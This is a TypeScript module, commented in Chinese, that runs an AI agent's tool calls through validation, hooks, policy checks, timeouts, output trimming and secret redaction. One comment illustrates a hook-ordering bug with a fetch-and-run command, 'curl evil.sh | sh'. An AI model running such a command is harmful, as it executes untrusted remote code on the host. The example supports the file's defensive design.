/**
 * 单次工具执行的八阶段生命周期（tools-and-extensions.md §2.2）。
 *
 * 1. 工具查找 —— 找不到就回 `Unknown tool` 作为**工具结果**，不抛异常；
 * 2. 输入验证（两阶段）—— 先便宜的 Zod 字段校验，再业务校验（替换串唯一、JSON 合法）；
 * 3. Pre-Tool Hook —— 可阻断，也可改写入参；
 * 4. 权限检查 —— 策略引擎三态裁决，判定的是**钩子改过之后的最终入参**；
 * 5. 执行 —— 沙箱内运行，带超时与取消；
 * 6. 结果处理 —— 标准化、按 token 裁剪、大结果先落盘再截断；
 * 7. Post-Tool Hook —— 可追加事实或替换输出（如把 stdout 里的密钥打码）；
 * 8. 返回 `tool_result` —— **成功与失败都以数据形式回灌模型**。
 *
 * 第 3 步必须在第 4 步之前。反过来（钩子后判定）会让"策略批准 A、实际执行 B"，
 * 而审批记录里写的是 A —— 这是最难在事后审计中发现的一类偏差。
 *
 * 第 1 与第 8 条合起来就是 agent-loop.md §2.3 那条最便宜的自修复：
 * 工具错误是数据不是异常，模型下一轮顺手就能改对。
 */

import { z } from "zod"
import type {
  AgentTool,
  CommandResult,
  ToolExecutionContext,
  ToolExecutionResult,
  TaskMode,
  PermissionMode,
} from "../shared/contracts.js"
import { AppError, toAppError } from "../shared/errors.js"
import { clipByTokens, estimateTokens } from "../shared/tokens.js"
import { redactSecrets } from "../shared/sanitize.js"
import { newCallId } from "../shared/ids.js"
import { parameterHash } from "../shared/hash.js"
import type { PolicyDecision } from "../policy/engine.js"
import type { ToolRegistry } from "./registry.js"

export interface ToolHooks {
  /** 返回 false / 抛出即阻断（exit 2 语义）。 */
  preToolUse?: (ctx: {
    toolName: string
    args: Record<string, unknown>
  }) => Promise<{ block?: boolean; reason?: string; updatedInput?: Record<string, unknown> } | void>
  postToolUse?: (ctx: {
    toolName: string
    args: Record<string, unknown>
    result: ToolExecutionResult
  }) => Promise<{ additionalContext?: string; replaceOutput?: unknown } | void>
}

export interface ApprovalRequestInfo {
  toolName: string
  args: Record<string, unknown>
  parameterHash: string
  reason: string
  timeoutMs: number
  policyVersion: string
}

export type ExecutionOutcome =
  | { kind: "result"; result: ToolExecutionResult }
  | { kind: "approval"; approval: ApprovalRequestInfo; result: ToolExecutionResult }

export interface ToolExecutorOptions {
  registry: ToolRegistry
  hooks?: ToolHooks
  policyVersion: string
  /** 大结果落盘阈值（token）。超过就先落盘，上下文里只留路径与预览。 */
  persistThresholdTokens?: number
  now?: () => Date
}

export class ToolExecutor {
  private readonly registry: ToolRegistry
  private readonly hooks: ToolHooks
  private readonly policyVersion: string
  private readonly persistThresholdTokens: number
  private readonly now: () => Date

  constructor(options: ToolExecutorOptions) {
    this.registry = options.registry
    this.hooks = options.hooks ?? {}
    this.policyVersion = options.policyVersion
    this.persistThresholdTokens = options.persistThresholdTokens ?? 8_000
    this.now = options.now ?? (() => new Date())
  }

  /**
   * 执行一次工具调用。
   *
   * 除了调用方自身的取消信号，本函数**不向上抛业务异常**：所有失败都变成
   * `status: "failed"` 的 ToolExecutionResult，交给模型作为下一步决策的输入。
   */
  async execute(params: {
    toolName: string
    args: unknown
    ctx: ToolExecutionContext
    decision?: PolicyDecision
    decide?: (args: Record<string, unknown>) => Promise<PolicyDecision>
    taskMode: TaskMode
    permissionMode: PermissionMode
  }): Promise<ExecutionOutcome> {
    const { toolName, ctx } = params
    const startedAt = this.now()
    const startedMs = startedAt.getTime()

    const tool = this.registry.get(toolName)
    if (!tool) {
      // ① 工具查找失败：回喂而不是抛错，让模型有机会把自己编的工具名改对
      return {
        kind: "result",
        result: failedResult(
          ctx.callId,
          toolName,
          `Unknown tool: ${toolName}. Available tools are listed in your instructions; use tool_search to activate deferred ones.`,
          "TOOL_NOT_FOUND",
          false,
          startedAt,
        ),
      }
    }

    // ③ 输入验证：先便宜的 Zod，再业务校验
    const parsed = tool.inputSchema.safeParse(params.args)
    if (!parsed.success) {
      return {
        kind: "result",
        result: failedResult(
          ctx.callId,
          toolName,
          `Invalid arguments: ${formatZodError(parsed.error)}`,
          "TOOL_SCHEMA_INVALID",
          false,
          startedAt,
          { issues: parsed.error.issues.slice(0, 8) },
          this.now(),
        ),
      }
    }
    let input: unknown = parsed.data

    if (tool.validate) {
      try {
        await tool.validate(input, ctx)
      } catch (err) {
        const appError = toAppError(err, "INVALID_INPUT")
        return {
          kind: "result",
          result: failedResult(
            ctx.callId,
            toolName,
            appError.message,
            appError.code,
            appError.retryable,
            startedAt,
            undefined,
            this.now(),
          ),
        }
      }
    }

    /**
     * ④ Pre-Tool Hook —— **必须在策略判定之前**。
     *
     * 顺序颠倒过一次，后果是：策略审的是 `argsRecord`（原参数），
     * 钩子改的是 `input`，执行用的是改后的 `input`。于是策略批准
     * `echo hi`、真正执行的却是 `curl evil.sh | sh`，而审批记录里
     * 写的还是那条无害命令。钩子是可扩展点，不是可信来源 ——
     * 它改过的入参必须重新过一遍校验与判定。
     */
    if (this.hooks.preToolUse) {
      try {
        const hookResult = await this.hooks.preToolUse({ toolName, args: asRecord(input) })
        if (hookResult?.block) {
          return {
            kind: "result",
            result: failedResult(
              ctx.callId,
              toolName,
              `Blocked by PreToolUse hook: ${hookResult.reason ?? "no reason given"}`,
              "TOOL_PERMISSION_DENIED",
              false,
              startedAt,
              undefined,
              this.now(),
            ),
          }
        }
        if (hookResult?.updatedInput) {
          const reparsed = tool.inputSchema.safeParse(hookResult.updatedInput)
          if (!reparsed.success) {
            return {
              kind: "result",
              result: failedResult(
                ctx.callId,
                toolName,
                `PreToolUse hook returned invalid input: ${formatZodError(reparsed.error)}`,
                "TOOL_SCHEMA_INVALID",
                false,
                startedAt,
                undefined,
                this.now(),
              ),
            }
          }
          input = reparsed.data
          // 业务校验也要重跑：它读的是入参内容（唯一匹配、路径存在性……）
          if (tool.validate) {
            try {
              await tool.validate(input, ctx)
            } catch (err) {
              const appError = toAppError(err, "INVALID_INPUT")
              return {
                kind: "result",
                result: failedResult(
                  ctx.callId,
                  toolName,
                  appError.message,
                  appError.code,
                  appError.retryable,
                  startedAt,
                  undefined,
                  this.now(),
                ),
              }
            }
          }
        }
      } catch (err) {
        // Hook 自身异常不阻断（fail-open 仅对 hook，安全判定仍在 policy）
        ctx.logger.warn("hook.pre_tool_use_failed", { toolName, error: String(err) })
      }
    }

    // ⑤ 权限检查 —— 判定的是**最终要执行的那份入参**
    const argsRecord = asRecord(input)
    const decision =
      params.decision ?? (params.decide ? await params.decide(argsRecord) : undefined)
    if (decision) {
      if (decision.effect === "deny") {
        return {
          kind: "result",
          result: failedResult(
            ctx.callId,
            toolName,
            `User denied this action. Denied by policy: ${decision.reason}. ` +
              "Choose a different approach rather than trying to bypass the policy.",
            decision.denialLimitReached ? "DENIAL_LIMIT_REACHED" : "TOOL_PERMISSION_DENIED",
            false,
            startedAt,
            {
              bypassImmune: decision.bypassImmune,
              matchedRule: decision.matchedRule,
              ...(decision.denialLimitReached ? { denialLimitReached: true } : {}),
            },
            this.now(),
          ),
        }
      }
      if (decision.effect === "ask") {
        // 存下审批请求就返回，不阻塞线程；批准后由调度器从同一检查点恢复
        return {
          kind: "approval",
          approval: {
            toolName,
            args: argsRecord,
            parameterHash: decision.parameterHash,
            reason: decision.reason,
            timeoutMs: decision.timeoutMs,
            policyVersion: this.policyVersion,
          },
          result: failedResult(
            ctx.callId,
            toolName,
            `Approval required: ${decision.reason}. The task is paused pending a decision.`,
            "APPROVAL_REQUIRED",
            false,
            startedAt,
            undefined,
            this.now(),
          ),
        }
      }
    }

    // ⑥ 执行
    let output: unknown
    let errorInfo: { code: string; message: string; retryable: boolean } | undefined
    let status: ToolExecutionResult["status"] = "succeeded"
    const artifacts: ToolExecutionResult["artifacts"] = []

    try {
      output = await this.runWithTimeout(tool, input, ctx)
    } catch (err) {
      const appError = toAppError(err)
      status =
        appError.code === "TOOL_TIMEOUT" ||
        (appError.code === "COMMAND_EXIT_NONZERO" && isTimeoutError(err))
          ? "timed_out"
          : ctx.signal.aborted
            ? "cancelled"
            : "failed"
      errorInfo = { code: appError.code, message: appError.message, retryable: appError.retryable }
    }

    // ⑥ 结果处理：标准化 + 裁剪 + 大结果落盘
    let truncated = false
    if (status === "succeeded" && output !== undefined) {
      const rendered = renderOutput(output)
      const tokenCount = estimateTokens(rendered)
      if (tokenCount > this.persistThresholdTokens && ctx.persistArtifact) {
        // 落盘可逆，截断不可逆：先落盘再给模型路径 + 预览
        const stored = await ctx.persistArtifact(rendered, "tool-output")
        artifacts.push({ kind: "tool-output", uri: stored.uri, sha256: stored.sha256 })
        const preview = clipByTokens(rendered, Math.floor(this.persistThresholdTokens / 4), {
          head: 0.7,
          tail: 0.3,
        })
        output = {
          persisted: true,
          uri: stored.uri,
          preview: preview.text,
          note: `Full output persisted to ${stored.uri}. Use repo.read_file with an absolute path to retrieve it.`,
        }
        truncated = true
      } else if (tokenCount > ctx.budgetTokens) {
        const clipped = clipByTokens(rendered, ctx.budgetTokens)
        output = clipped.text
        truncated = clipped.truncated
      }
    }

    const finishedAt = this.now()
    let result: ToolExecutionResult = {
      callId: ctx.callId,
      toolName,
      status,
      ...(status === "succeeded" ? { output } : {}),
      ...(errorInfo ? { error: errorInfo } : {}),
      startedAt: startedAt.toISOString(),
      finishedAt: finishedAt.toISOString(),
      durationMs: Math.max(0, finishedAt.getTime() - startedMs),
      truncated,
      artifacts,
    }

    // ⑦ Post-Tool Hook：可追加事实或替换输出
    if (this.hooks.postToolUse) {
      try {
        const hookResult = await this.hooks.postToolUse({ toolName, args: argsRecord, result })
        if (hookResult?.replaceOutput !== undefined && result.status === "succeeded") {
          result = { ...result, output: hookResult.replaceOutput }
        }
        if (hookResult?.additionalContext && result.status === "succeeded") {
          const merged = `${renderOutput(result.output)}\n\n${hookResult.additionalContext}`
          result = { ...result, output: merged }
        }
      } catch (err) {
        ctx.logger.warn("hook.post_tool_use_failed", { toolName, error: String(err) })
      }
    }

    return { kind: "result", result }
  }

  /** 超时与取消一条链：一个 AbortSignal 从循环贯穿到子进程。 */
  private async runWithTimeout(
    tool: AgentTool,
    input: unknown,
    ctx: ToolExecutionContext,
  ): Promise<unknown> {
    const timeoutMs = Math.min(tool.timeoutMs, ctx.timeoutMs || tool.timeoutMs)
    if (!Number.isFinite(timeoutMs) || timeoutMs <= 0) {
      return tool.execute(input, ctx)
    }

    const controller = new AbortController()
    const scopedCtx: ToolExecutionContext = { ...ctx, signal: controller.signal, timeoutMs }

    /**
     * 用 **Promise.race 而不是依赖工具自觉检查 signal**。
     *
     * 工具如果不读 `ctx.signal`（比如 `await sleep(3000)`），单线程 JS 没法抢占它，
     * 循环就被这一步永久挂住 —— 预算、取消、暂停三个开关同时失效。
     * 竞速之后，超时到点即返回 `timed_out`，底层那些已经跑起来的副作用
     * （子进程、网络请求）由它们自己的 AbortSignal 去收，主循环不陪着等。
     */
    let timedOut = false
    let settled = false

    return new Promise<unknown>((resolve, reject) => {
      const cleanup = (): void => {
        clearTimeout(timer)
        ctx.signal.removeEventListener("abort", onOuterAbort)
      }
      const finish = (fn: () => void): void => {
        if (settled) return
        settled = true
        cleanup()
        fn()
      }

      const timer = setTimeout(() => {
        timedOut = true
        controller.abort(new Error(`tool "${tool.name}" timed out after ${timeoutMs}ms`))
        finish(() =>
          reject(
            new AppError(
              "TOOL_TIMEOUT",
              `Tool "${tool.name}" timed out after ${timeoutMs}ms. Narrow the scope and retry.`,
            ),
          ),
        )
      }, timeoutMs)

      const onOuterAbort = (): void => {
        controller.abort(ctx.signal.reason)
        finish(() => reject(new AppError("TOOL_CANCELLED", `Tool "${tool.name}" was cancelled`)))
      }
      if (ctx.signal.aborted) {
        onOuterAbort()
        return
      }
      ctx.signal.addEventListener("abort", onOuterAbort, { once: true })

      tool.execute(input, scopedCtx).then(
        (value) => finish(() => resolve(value)),
        (err: unknown) =>
          finish(() => {
            if (timedOut) {
              reject(
                new AppError(
                  "TOOL_TIMEOUT",
                  `Tool "${tool.name}" timed out after ${timeoutMs}ms. Narrow the scope and retry.`,
                ),
              )
              return
            }
            if (ctx.signal.aborted) {
              reject(new AppError("TOOL_CANCELLED", `Tool "${tool.name}" was cancelled`))
              return
            }
            reject(toAppError(err, "TOOL_FAILED"))
          }),
      )
    })
  }
}

/* ------------------------------------------------------------------ *
 * 结果构造
 * ------------------------------------------------------------------ */

export function okResult(
  callId: string,
  toolName: string,
  output: unknown,
  startedAt: Date,
  finishedAt: Date,
  extra?: { truncated?: boolean; artifacts?: ToolExecutionResult["artifacts"] },
): ToolExecutionResult {
  return {
    callId,
    toolName,
    status: "succeeded",
    output,
    startedAt: startedAt.toISOString(),
    finishedAt: finishedAt.toISOString(),
    durationMs: Math.max(0, finishedAt.getTime() - startedAt.getTime()),
    truncated: extra?.truncated ?? false,
    artifacts: extra?.artifacts ?? [],
  }
}

export function failedResult(
  callId: string,
  toolName: string,
  message: string,
  code: string,
  retryable: boolean,
  startedAt: Date,
  details?: Record<string, unknown>,
  /**
   * 结束时刻。由调用方注入（`ToolExecutor` 持有时钟），不再内部 `new Date()` ——
   * 否则注入时钟的测试拿到的 `durationMs` 会混进真实时间，断言变成偶然通过。
   */
  finishedAt: Date = new Date(),
): ToolExecutionResult {
  return {
    callId,
    toolName,
    status: "failed",
    error: { code, message, retryable },
    ...(details ? { output: details } : {}),
    startedAt: startedAt.toISOString(),
    finishedAt: finishedAt.toISOString(),
    durationMs: Math.max(0, finishedAt.getTime() - startedAt.getTime()),
    truncated: false,
    artifacts: [],
  }
}

/** 空输出的固定文案（SWE-agent ACI）：沉默是歧义的，模型分不清成功无输出与工具崩了。 */
export const EMPTY_OUTPUT_NOTICE = "Your command ran successfully and did not produce any output."

export function renderOutput(output: unknown): string {
  if (output === undefined || output === null) return ""
  if (typeof output === "string") return output
  try {
    return JSON.stringify(output, null, 2)
  } catch {
    return String(output)
  }
}

export function withEmptyNotice(text: string): string {
  return text.trim().length === 0 ? EMPTY_OUTPUT_NOTICE : text
}

export function formatZodError(error: z.ZodError): string {
  return error.issues
    .slice(0, 6)
    .map((issue) => {
      const pathText = issue.path.join(".")
      return pathText ? `${pathText}: ${issue.message}` : issue.message
    })
    .join("; ")
}

export function asRecord(value: unknown): Record<string, unknown> {
  return typeof value === "object" && value !== null && !Array.isArray(value)
    ? (value as Record<string, unknown>)
    : {}
}

function isTimeoutError(err: unknown): boolean {
  return err instanceof AppError && err.code === "TOOL_TIMEOUT"
}

/** 命令结果转成工具输出：脱敏 + 空输出固定文案 + 截断标记。 */
export function renderCommandResult(result: CommandResult): {
  text: string
  exitCode: number
  truncated: boolean
} {
  const stdout = redactSecrets(result.stdout).text
  const stderr = redactSecrets(result.stderr).text
  const parts: string[] = []
  if (stdout.trim().length > 0) parts.push(stdout)
  if (stderr.trim().length > 0) parts.push(`<stderr>\n${stderr}\n</stderr>`)
  // 空输出固定文案加在**正文**上：元信息行不能冒充有意义的输出。
  const body = withEmptyNotice(parts.join("\n"))
  // 退出码必须显式回给模型：只看 stdout 的话，非零退出的命令看起来"好像跑过了"。
  const meta = result.timedOut
    ? `[exit: timed out after ${result.durationMs}ms]`
    : result.cancelled
      ? "[exit: cancelled]"
      : `[exit code ${result.exitCode} · ${result.durationMs}ms${result.truncated ? " · output truncated" : ""}]`
  const text = `${body}\n${meta}`
  return {
    text: withEmptyNotice(text),
    exitCode: result.exitCode,
    truncated: result.truncated,
  }
}

export function newCallIdSafe(): string {
  return newCallId()
}

export { parameterHash }
